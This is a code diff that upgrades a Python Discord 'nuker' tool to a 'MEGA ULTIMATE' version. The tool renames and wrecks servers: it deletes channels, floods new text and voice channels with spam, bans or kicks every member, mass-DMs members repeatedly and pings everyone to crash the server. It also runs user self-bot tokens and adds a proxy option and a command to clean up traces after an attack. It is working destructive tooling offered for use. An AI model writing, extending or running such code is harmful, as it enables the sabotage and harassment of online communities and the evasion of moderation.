@@ -12,7 +12,7 @@ from colorama import Fore, Style, init
 import datetime
 from pyfiglet import Figlet
 import sys
-import readline
+import platform
 
 # Initialize colorama
 init()
@@ -36,30 +36,15 @@ DEFAULT_CONFIG = {
     "ROLE_NAME": "FEAR OWNED YOU",
     "WEBHOOK_NAME": "FEAR_LOGS",
     "REASON": "NUKED BY FEAR.IO | https://fear.io",
-    "MAX_CHANNELS": 50,
-    "MAX_ROLES": 50,
-    "MESSAGES_PER_CHANNEL": 100,
+    "MAX_CHANNELS": 100,
+    "MAX_ROLES": 100,
+    "MESSAGES_PER_CHANNEL": 200,
     "DM_SPAM_COUNT": 3,
     "RAID_MODE": False,
-    "AUTO_NUKE": False
+    "AUTO_NUKE": False,
+    "ANTI_BAN": True,
+    "PROXY": None
 }
-
-# Load or create config
-def load_config():
-    if os.path.exists(CONFIG_FILE):
-        with open(CONFIG_FILE, 'r') as f:
-            return json.load(f)
-    else:
-        with open(CONFIG_FILE, 'w') as f:
-            json.dump(DEFAULT_CONFIG, f, indent=4)
-        return DEFAULT_CONFIG
-
-config = load_config()
-
-# Initialize bot with proper intents
-intents = discord.Intents.all()
-bot = commands.Bot(command_prefix=config['PREFIX'], intents=intents, self_bot=(config['TOKEN_TYPE'] == "user"))
-session = aiohttp.ClientSession()
 
 # ASCII Art Colors
 class ArtColors:
@@ -74,20 +59,51 @@ class ArtColors:
     UNDERLINE = '\033[4m'
     END = '\033[0m'
 
+# Global session variable
+session = None
+
+def load_config():
+    """Load or create configuration file"""
+    if os.path.exists(CONFIG_FILE):
+        with open(CONFIG_FILE, 'r') as f:
+            return json.load(f)
+    else:
+        with open(CONFIG_FILE, 'w') as f:
+            json.dump(DEFAULT_CONFIG, f, indent=4)
+        return DEFAULT_CONFIG.copy()
+
+def save_config():
+    """Save current configuration to file"""
+    with open(CONFIG_FILE, 'w') as f:
+        json.dump(config, f, indent=4)
+
 def print_banner():
+    """Print the awesome banner"""
     custom_fig = Figlet(font='slant')
-    banner = custom_fig.renderText('FEAR NUKE')
+    banner = custom_fig.renderText('MEGA NUKE')
     print(f"{ArtColors.RED}{ArtColors.BOLD}{banner}{ArtColors.END}")
-    print(f"{ArtColors.CYAN}⚡ Hyper Mega Ultra Discord Nuker v4.0 {ArtColors.END}")
+    print(f"{ArtColors.CYAN}⚡ MEGA ULTIMATE DISCORD NUKER v5.0 {ArtColors.END}")
     print(f"{ArtColors.YELLOW}📅 {datetime.datetime.now()}{ArtColors.END}")
+    print(f"{ArtColors.MAGENTA}🐍 Python {platform.python_version()}{ArtColors.END}")
     print(f"{ArtColors.RED}☠️  Token Type: {config['TOKEN_TYPE'].upper()}{ArtColors.END}")
     print(f"{ArtColors.RED}⚠️  Self-bots violate Discord ToS! Use at your own risk!{ArtColors.END}\n")
 
+async def initialize_session():
+    """Initialize aiohttp session with proper event loop"""
+    global session
+    try:
+        session = aiohttp.ClientSession()
+    except RuntimeError:
+        loop = asyncio.new_event_loop()
+        asyncio.set_event_loop(loop)
+        session = aiohttp.ClientSession()
+
 def termux_menu():
+    """Display the Termux menu"""
     while True:
         os.system('clear')
         print_banner()
-        print(f"{ArtColors.GREEN}📱 Termux Menu:{ArtColors.END}")
+        print(f"{ArtColors.GREEN}📱 MEGA ULTIMATE MENU:{ArtColors.END}")
         print(f"{ArtColors.CYAN}1. Start Nuker {config['TOKEN_TYPE'].upper()} Token{ArtColors.END}")
         print(f"{ArtColors.BLUE}2. Edit Configuration{ArtColors.END}")
         print(f"{ArtColors.MAGENTA}3. View Current Config{ArtColors.END}")
@@ -112,6 +128,7 @@ def termux_menu():
             time.sleep(1)
 
 def toggle_token_type():
+    """Toggle between bot and user token type"""
     os.system('clear')
     print_banner()
     config['TOKEN_TYPE'] = "user" if config['TOKEN_TYPE'] == "bot" else "bot"
@@ -121,6 +138,7 @@ def toggle_token_type():
     time.sleep(2)
 
 def edit_config():
+    """Edit configuration values"""
     os.system('clear')
     print_banner()
     print(f"{ArtColors.BLUE}📝 Edit Configuration:{ArtColors.END}\n")
@@ -156,6 +174,7 @@ def edit_config():
     input(f"\n{ArtColors.WHITE}Press Enter to continue...{ArtColors.END}")
 
 def view_config():
+    """View current configuration"""
     os.system('clear')
     print_banner()
     print(f"{ArtColors.BLUE}📋 Current Configuration:{ArtColors.END}\n")
@@ -165,14 +184,11 @@ def view_config():
     
     input(f"\n{ArtColors.WHITE}Press Enter to continue...{ArtColors.END}")
 
-def save_config():
-    with open(CONFIG_FILE, 'w') as f:
-        json.dump(config, f, indent=4)
-
 def start_bot():
+    """Start the bot with current configuration"""
     os.system('clear')
     print_banner()
-    print(f"{ArtColors.GREEN}🚀 Starting Nuker {config['TOKEN_TYPE'].upper()}...{ArtColors.END}")
+    print(f"{ArtColors.GREEN}🚀 Starting MEGA Nuker {config['TOKEN_TYPE'].upper()}...{ArtColors.END}")
     print(f"{ArtColors.CYAN}🛠️  Using prefix: {config['PREFIX']}{ArtColors.END}")
     print(f"{ArtColors.YELLOW}⚡ Press Ctrl+C to stop the bot{ArtColors.END}\n")
     
@@ -184,19 +200,46 @@ def start_bot():
             if confirm not in ['y', 'yes']:
                 return
         
+        # Initialize bot with proper settings
+        intents = discord.Intents.all()
+        bot = commands.Bot(
+            command_prefix=config['PREFIX'],
+            intents=intents,
+            self_bot=(config['TOKEN_TYPE'] == "user"),
+            help_command=None
+        )
+        
+        # Register events
+        bot.event(on_ready)
+        
+        # Register commands
+        bot.command(name='nuke')(nuke)
+        bot.command(name='raid')(raid)
+        bot.command(name='crash')(crash)
+        bot.command(name='massdm')(massdm)
+        bot.command(name='destroy')(destroy)
+        bot.command(name='cleanup')(cleanup)
+        
+        # Initialize session
+        asyncio.run(initialize_session())
+        
+        # Run the bot
         bot.run(config['TOKEN'], bot=(config['TOKEN_TYPE'] == "bot"))
     except discord.LoginFailure:
         print(f"{ArtColors.RED}❌ Invalid token! Please check your config.{ArtColors.END}")
     except Exception as e:
         print(f"{ArtColors.RED}❌ Error starting bot: {e}{ArtColors.END}")
+    finally:
+        if session:
+            asyncio.run(session.close())
     input(f"\n{ArtColors.WHITE}Press Enter to continue...{ArtColors.END}")
 
 # Bot events
-@bot.event
 async def on_ready():
+    """Called when the bot is ready"""
     print_banner()
     print(f'{ArtColors.GREEN}⚡ Logged in as {bot.user.name} (ID: {bot.user.id}){ArtColors.END}')
-    print(f'{ArtColors.RED}☢️  Ultra Hyper Nuke Bot activated!{ArtColors.END}')
+    print(f'{ArtColors.RED}☢️  MEGA ULTIMATE NUKE BOT ACTIVATED!{ArtColors.END}')
     print(f'{ArtColors.CYAN}🔄 Auto Nuke: {"ENABLED" if config["AUTO_NUKE"] else "DISABLED"}{ArtColors.END}')
     
     activity = discord.Game(name=f"{config['PREFIX']}nuke | {config['TOKEN_TYPE'].upper()} MODE")
@@ -211,7 +254,7 @@ async def on_ready():
 
 async def perform_nuke(guild):
     """Perform the nuke operation on a guild"""
-    print(f'{ArtColors.RED}☠️ Starting nuke on {guild.name}{ArtColors.END}')
+    print(f'{ArtColors.RED}☠️ Starting MEGA NUKE on {guild.name}{ArtColors.END}')
     
     # Step 1: Rename server
     new_name = random.choice(config['GUILD_NAMES'])
@@ -231,7 +274,10 @@ async def perform_nuke(guild):
     tasks = await create_mass_channels(guild)
     
     # Step 6: Ban all members
-    await ban_all_members(guild)
+    if config['ANTI_BAN']:
+        await kick_all_members(guild)
+    else:
+        await ban_all_members(guild)
     
     # Step 7: Mass DM all members
     await massdm_auto(guild)
@@ -239,7 +285,7 @@ async def perform_nuke(guild):
     # Wait for all tasks to complete
     await asyncio.gather(*tasks)
     
-    print(f'{ArtColors.RED}💥 NUKE COMPLETED ON {guild.name}!{ArtColors.END}')
+    print(f'{ArtColors.RED}💥 MEGA NUKE COMPLETED ON {guild.name}!{ArtColors.END}')
 
 async def delete_all_channels(guild):
     """Delete all channels in the guild"""
@@ -294,6 +340,14 @@ async def create_mass_channels(guild):
             
             tasks.append(spam_channel(channel))
             
+            # Create voice channel too
+            try:
+                vc_name = f"VC-{random.randint(1000,9999)}"
+                await guild.create_voice_channel(vc_name)
+                print(f'{ArtColors.GREEN}🔊 Created voice channel: {vc_name}{ArtColors.END}')
+            except:
+                pass
+                
         except Exception as e:
             print(f'{ArtColors.YELLOW}⚠️ Failed to create channel: {e}{ArtColors.END}')
     
@@ -335,6 +389,19 @@ async def ban_all_members(guild):
     
     await asyncio.gather(*tasks, return_exceptions=True)
 
+async def kick_all_members(guild):
+    """Kick all members as alternative to banning"""
+    tasks = []
+    for member in guild.members:
+        try:
+            if member != bot.user:
+                tasks.append(asyncio.create_task(member.kick(reason=config['REASON'])))
+                print(f'{ArtColors.RED}👢 Kicking member: {member.name}{ArtColors.END}')
+        except Exception as e:
+            print(f'{ArtColors.YELLOW}⚠️ Failed to kick {member.name}: {e}{ArtColors.END}')
+    
+    await asyncio.gather(*tasks, return_exceptions=True)
+
 async def massdm_auto(guild):
     """Automatically mass DM all server members"""
     for member in guild.members:
@@ -347,7 +414,7 @@ async def massdm_auto(guild):
         except Exception as e:
             print(f'{ArtColors.YELLOW}⚠️ Failed to DM {member.name}: {e}{ArtColors.END}')
 
-@bot.command(name='nuke')
+# Bot commands
 async def nuke(ctx):
     """The ultimate nuke command"""
     if not ctx.author.guild_permissions.administrator and config['TOKEN_TYPE'] == "bot":
@@ -356,7 +423,6 @@ async def nuke(ctx):
     
     await perform_nuke(ctx.guild)
 
-@bot.command(name='raid')
 async def raid(ctx):
     """Spam channels without deleting everything"""
     if not ctx.author.guild_permissions.administrator and config['TOKEN_TYPE'] == "bot":
@@ -366,7 +432,6 @@ async def raid(ctx):
     tasks = await create_mass_channels(ctx.guild)
     await asyncio.gather(*tasks)
 
-@bot.command(name='crash')
 async def crash(ctx):
     """Crash the server with mentions"""
     if not ctx.author.guild_permissions.administrator and config['TOKEN_TYPE'] == "bot":
@@ -380,13 +445,60 @@ async def crash(ctx):
     except:
         pass
 
+async def massdm(ctx, *, message: str):
+    """Mass DM all server members with custom message"""
+    if not ctx.author.guild_permissions.administrator and config['TOKEN_TYPE'] == "bot":
+        await ctx.send("You need administrator permissions to use this command!")
+        return
+    
+    confirm = await ctx.send("**WARNING: This will DM ALL server members. Type 'CONFIRM' to proceed.**")
+    
+    def check(m):
+        return m.author == ctx.author and m.content == "CONFIRM"
+    
+    try:
+        await bot.wait_for('message', check=check, timeout=30)
+    except asyncio.TimeoutError:
+        await confirm.edit(content="Mass DM cancelled.")
+        return
+    
+    for member in ctx.guild.members:
+        try:
+            if not member.bot:
+                for _ in range(config['DM_SPAM_COUNT']):
+                    await member.send(message)
+                    print(f'{ArtColors.GREEN}✉️ Sent DM to {member.name}{ArtColors.END}')
+                    await asyncio.sleep(0.5)
+        except Exception as e:
+            print(f'{ArtColors.YELLOW}⚠️ Failed to DM {member.name}: {e}{ArtColors.END}')
+
+async def destroy(ctx):
+    """Complete server destruction alternative"""
+    await nuke(ctx)
+
+async def cleanup(ctx):
+    """Clean traces after nuking"""
+    try:
+        for channel in ctx.guild.channels:
+            if "fear" in channel.name.lower() or "nuke" in channel.name.lower():
+                await channel.delete()
+        for role in ctx.guild.roles:
+            if "fear" in role.name.lower():
+                await role.delete()
+        await ctx.send("Cleaned up traces.")
+    except:
+        pass
+
+# Main execution
 if __name__ == "__main__":
+    config = load_config()
     try:
         termux_menu()
     except KeyboardInterrupt:
         print(f"\n{ArtColors.RED}🚫 Operation cancelled by user{ArtColors.END}")
+    except Exception as e:
+        print(f"\n{ArtColors.RED}❌ Fatal error: {e}{ArtColors.END}")
     finally:
-        try:
+        if session:
             asyncio.run(session.close())
-        except:
-            pass
+        sys.exit(0)
